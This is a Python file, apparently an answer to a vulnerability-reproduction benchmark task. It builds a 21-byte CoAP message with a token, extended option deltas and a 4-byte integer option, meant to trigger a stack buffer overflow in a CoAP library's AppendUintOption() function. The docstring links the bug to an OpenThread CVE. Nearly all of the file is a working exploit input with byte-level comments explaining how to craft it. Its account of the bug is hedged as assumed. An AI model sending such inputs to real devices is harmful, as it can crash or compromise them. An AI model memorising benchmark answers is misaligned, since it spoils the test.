import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept (PoC) that triggers a Stack Buffer Overflow
        in the AppendUintOption() function of a CoAP message library.

        The vulnerability is assumed to be similar to CVE-2019-17549 found in
        OpenThread's CoAP implementation. A flawed series of `if` statements,
        instead of `else if`, causes an incorrect number of bytes to be written
        to a temporary stack buffer when encoding an unsigned integer option.
        This overflow is triggered by any integer value that is 4 bytes long
        when encoded (i.e., value >= 0x1000000).

        The PoC is a crafted 21-byte CoAP message, matching the ground-truth
        length. This specific length suggests that the execution path in the
        vulnerable test harness may require certain message features, such as
        a token and extended option deltas, which are included in this PoC.

        The message structure is:
        - 4-byte CoAP Header with Token Length (TKL) set to 8.
        - 8-byte arbitrary Token.
        - 9 bytes of CoAP Options, split into two:
          1. A 2-byte option to set up the option delta for the next one.
          2. A 7-byte option containing the 4-byte integer value (0xDEADBEEF)
             that triggers the overflow. This option uses an extended delta to
             help meet the overall 21-byte length requirement.
        
        Args:
            src_path: Path to the vulnerable source code tarball (unused).

        Returns:
            bytes: The PoC input that should trigger the vulnerability.
        """
        
        # 1. CoAP Header (4 bytes)
        # Version=1, Type=CON(0), Token Length=8 => 0b01001000 = 0x48
        # Code=GET(1), Message ID=0xCAFE (arbitrary)
        ver_type_tkl = 0x48
        code = 0x01
        msg_id = 0xCAFE
        header = struct.pack('!BBH', ver_type_tkl, code, msg_id)

        # 2. Token (8 bytes, as specified by TKL)
        token = b'\x01\x02\x03\x04\x05\x06\x07\x08'
        
        # 3. Options (9 bytes total to reach 21 bytes)
        
        # Option 1: Sets up the option number for delta calculation (2 bytes)
        # Delta=5, Length=1 => Header Byte: (5 << 4) | 1 = 0x51
        # Value=0xAA
        option1 = b'\x51\xaa'

        # Option 2: The trigger option (7 bytes)
        # Target option number 275. Previous was 5. Delta = 270.
        # This requires a 2-byte extended delta (nibble=14).
        # Extended Delta Value = 270 - 269 = 1.
        # Trigger Value = 0xDEADBEEF (>= 0x1000000), Length = 4.
        # Option Header Byte: (delta_nibble=14 << 4) | (len_nibble=4) = 0xE4
        option_header_2 = 0xE4
        extended_delta_2 = 1
        trigger_value = 0xDEADBEEF
        option2 = struct.pack('!BHL', option_header_2, extended_delta_2, trigger_value)
        
        # 4. Assemble the final PoC
        poc = header + token + option1 + option2
        return poc
